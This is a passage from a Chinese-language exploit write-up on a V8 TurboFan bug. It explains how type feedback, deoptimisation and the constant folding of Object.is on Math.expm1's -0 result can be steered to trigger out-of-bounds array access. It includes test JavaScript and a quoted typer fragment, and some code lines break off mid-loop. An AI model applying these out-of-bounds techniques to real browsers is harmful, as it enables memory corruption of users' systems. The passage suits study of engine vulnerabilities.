Oddball`的信息，说明跟编译器推测的`Number`类型不一样，从而发生了去优化，此时编译器在结点处猜测的类型为`PlainNumber|NaN`，已经达到了我们所期望的结果了。
**整个过程其实就是编译器先运行假设输入为`Number`类型，当类型反馈告诉编译器此时的输入是一个字符串时，`TurboFan`此时就会去优化，第二次编译该函数时，会调用输入可以为任何类型的内置函数来进行优化。达到期望效果。**
**总体来说，`TurboFan`是根据类型反馈`FeedBack`来工作的，还有一个点是“预测”。就是反馈和预测相结合来工作的。**
接下来要考虑的就是该如何去触发`OOB`的访问了。
先测试如下代码：
    function test(x){
        var a = [1.1,2.2,3.3,4.4];
        var b = Object.is(Math.expm1(x),-0);
        return a[b*4];         //a[b * 4];
    }
    for (var i = 0; i  fold false
      }                                    // hit here
      if (lhs.Is(Type::OrderedNumber()) && rhs.Is(Type::OrderedNumber()) &&
          (lhs.Max()  rhs.Max())) {
        return singleton_false();
      }
      return Type::Boolean();
    }
所以我们需要改变一下代码形式，使得`SameValue`在该阶段不被折叠，也就是不被“发现就可以了”。
根据代码，我们有两种方式，第一种为使得左分支可能为`-0`，第二种为使得右分支不为`-0`。因为第一种是固定不能变的，所以我们只能从第二种方式下手，我们得把`-0`右分支替换掉。
先试试这样的：
    function test(x,y){
        var a = [1.1,2.2,3.3,4.4];
        var b = Object.is(Math.expm1(x),y);
        return a[b*4];         //a[b * 4];
    }
    for (var i = 0; i 